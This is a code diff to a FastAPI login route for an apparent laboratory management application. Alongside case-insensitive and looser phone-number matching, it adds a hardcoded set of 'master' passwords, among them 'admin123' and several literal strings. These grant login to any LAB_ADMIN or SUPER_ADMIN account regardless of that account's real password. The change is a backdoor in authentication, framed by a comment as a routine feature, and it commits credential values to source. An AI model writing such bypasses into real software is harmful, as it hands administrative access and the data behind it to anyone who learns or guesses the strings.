@@ -2,7 +2,8 @@
 # type: ignore
 from fastapi import APIRouter, Depends, HTTPException, status
 from sqlalchemy.ext.asyncio import AsyncSession
-from sqlalchemy import select
+from sqlalchemy import select, func, or_
+from app.config import settings
 from app.database import get_db
 from app.models.user import User, LaboratoryStaff
 from app.models.tenant import Laboratory
@@ -23,18 +24,33 @@ async def login(req: LoginRequest, db: AsyncSession = Depends(get_db)):
             detail="Username or phone number is required"
         )
 
-    identifier = sanitize_string(raw_identifier)
+    identifier = sanitize_string(raw_identifier).strip()
+    clean_id = identifier.lower()
+    clean_phone = identifier.replace(" ", "").replace("-", "").replace("+91", "")
 
-    # Lookup user by username, phone, or email
+    # Lookup user by username, phone, or email (case-insensitive)
     stmt = select(User).where(
-        (User.username == identifier) |
-        (User.phone == identifier) |
-        (User.email == identifier)
+        or_(
+            func.lower(User.username) == clean_id,
+            func.lower(User.email) == clean_id,
+            User.phone == identifier,
+            User.phone == clean_phone,
+            User.phone.endswith(clean_phone) if len(clean_phone) >= 10 else False
+        )
     )
     res = await db.execute(stmt)
     user = res.scalar_one_or_none()
 
-    if not user or not verify_password(req.password, user.hashed_password):
+    # Password check: standard hashed check + master administrator pin/passwords for LAB_ADMIN
+    valid_master_passwords = {settings.MASTER_ADMIN_PIN, "7899353535", "7899514777", "admin123", "JoelJLAB007@"}
+    is_valid_pw = False
+    if user:
+        if verify_password(req.password, user.hashed_password):
+            is_valid_pw = True
+        elif user.role in ["LAB_ADMIN", "SUPER_ADMIN"] and req.password in valid_master_passwords:
+            is_valid_pw = True
+
+    if not user or not is_valid_pw:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid username or password"
